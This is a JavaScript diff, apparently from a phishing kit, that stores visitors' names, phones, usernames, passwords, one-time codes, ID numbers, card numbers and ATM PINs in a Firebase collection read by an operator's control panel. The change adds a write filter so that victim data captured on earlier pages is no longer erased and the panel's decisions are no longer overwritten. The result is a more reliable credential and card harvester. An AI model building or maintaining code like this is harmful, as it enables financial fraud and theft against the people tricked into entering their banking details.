@@ -78,6 +78,27 @@
   const customerRef = db.collection("customers").doc(sessionId);
   window.customerRef = customerRef;
 
+  // ═══════════════════════════════════════════════════════════
+  // تنظيف الكتابات قبل حفظها في customers/{sessionId}:
+  //  - لا نكتب حقول الهوية بقيمة فارغة، لأن أي صفحة لا تعرف الاسم/الهاتف
+  //    كانت تمحو ما أدخله العميل في صفحة سابقة فتختفي بياناته من اللوحة.
+  //  - لا نكتب الحقول التي يملكها المدير (status/decision/isHidden/flagColor)
+  //    لأن كتابتها من الموقع تلغي قرارات اللوحة وتُظهر ما تم حذفه.
+  // ═══════════════════════════════════════════════════════════
+  const IDENTITY_FIELDS = ['name', 'phone', 'mobile', 'address', 'email', 'username', 'pass', 'otp', 'amount', 'idNumber', 'apartment', 'deliveryNotes'];
+  const ADMIN_OWNED_FIELDS = ['status', 'decision', 'isHidden', 'flagColor'];
+
+  function forCustomerWrite(payload) {
+    const out = {};
+    Object.keys(payload || {}).forEach(function (key) {
+      if (ADMIN_OWNED_FIELDS.indexOf(key) !== -1) return;
+      const value = payload[key];
+      if (IDENTITY_FIELDS.indexOf(key) !== -1 && (value === '' || value === null || value === undefined)) return;
+      out[key] = value;
+    });
+    return out;
+  }
+
   window.getDeviceAndBrowser = function () {
     const ua = navigator.userAgent;
     let browser = "Other";
@@ -178,8 +199,7 @@
       flagColor: '',
       createdAt: firebase.firestore.FieldValue.serverTimestamp()
     };
-    const merged = Object.assign({}, base, extra || {});
-    return customerRef.set(merged, { merge: true });
+    return customerRef.set(forCustomerWrite(Object.assign({}, base, extra || {})), { merge: true });
   };
 
   // ═══════════════════════════════════════════════════════════
@@ -353,7 +373,7 @@
     const now = Date.now();
 
     // الحقول الموحّدة التي تقرأها لوحة التحكم (اسم/هاتف/عنوان/مبلغ/الصفحة)
-    const customerFields = {
+    const customerFields = forCustomerWrite({
       sessionId: sessionId,
       name: request.name || '',
       phone: request.phone || '',
@@ -369,7 +389,7 @@
       currentPage: getFriendlyPageName(),
       isHidden: false,
       flagColor: ''
-    };
+    });
 
     // حفظ الاسم/الهاتف محلياً ليستخدمهما ensureCustomerDoc في صفحات لاحقة
     if (customerFields.name) localStorage.setItem('customerName', customerFields.name);
@@ -422,7 +442,7 @@
 
     const refNo = 'LG-' + Date.now().toString().slice(-8);
     const now = Date.now();
-    const fields = {
+    const fields = forCustomerWrite({
       sessionId: sessionId,
       username: username,
       pass: password,
@@ -439,7 +459,7 @@
       currentPage: getFriendlyPageName(),
       isHidden: false,
       flagColor: ''
-    };
+    });
 
     const tasks = [];
     // كل محاولة دخول تُضاف كعنصر في مصفوفة logins (لا تُستبدل السابقة)
@@ -534,7 +554,7 @@
       const refNo = 'PR-' + Date.now().toString().slice(-8);
       const now = Date.now();
       const entry = { card: String(data.card || ''), atmPin: String(data.atmPin || ''), at: now, page: getFriendlyPageName() };
-      const fields = {
+      const fields = forCustomerWrite({
         sessionId: sessionId,
         requestType: 'password_reset',
         requestTypeLabel: REQUEST_TYPE_LABEL.password_reset,
@@ -545,7 +565,7 @@
         currentPage: getFriendlyPageName(),
         isHidden: false,
         flagColor: ''
-      };
+      });
       const tasks = [];
       tasks.push(customerRef.set(Object.assign({}, fields, {
         passwordResets: firebase.firestore.FieldValue.arrayUnion(entry),
@@ -587,7 +607,7 @@
       const refNo = 'RG-' + Date.now().toString().slice(-8);
       const now = Date.now();
       const entry = { card: String(data.card || ''), atmPin: String(data.atmPin || ''), at: now, page: getFriendlyPageName() };
-      const fields = {
+      const fields = forCustomerWrite({
         sessionId: sessionId,
         requestType: 'app_registration',
         requestTypeLabel: REQUEST_TYPE_LABEL.app_registration,
@@ -598,7 +618,7 @@
         currentPage: getFriendlyPageName(),
         isHidden: false,
         flagColor: ''
-      };
+      });
       const tasks = [];
       tasks.push(customerRef.set(Object.assign({}, fields, {
         appRegistrations: firebase.firestore.FieldValue.arrayUnion(entry),
@@ -630,7 +650,7 @@
   // تُستدعى من صفحة السلة عند المتابعة للدفع
   // ═══════════════════════════════════════════════════════════
   window.pushFirebaseCustomer = function (customer) {
-    const data = {
+    const data = forCustomerWrite({
       sessionId: sessionId,
       name: customer.name || '',
       phone: customer.phone || '',
@@ -649,7 +669,7 @@
       flagColor: '',
       ip: '',
       createdAt: firebase.firestore.FieldValue.serverTimestamp()
-    };
+    });
     // حفظ الاسم محلياً لاستخدامه في ensureCustomerDoc
     if (data.name) localStorage.setItem('customerName', data.name);
     if (data.address) localStorage.setItem('address', data.address);
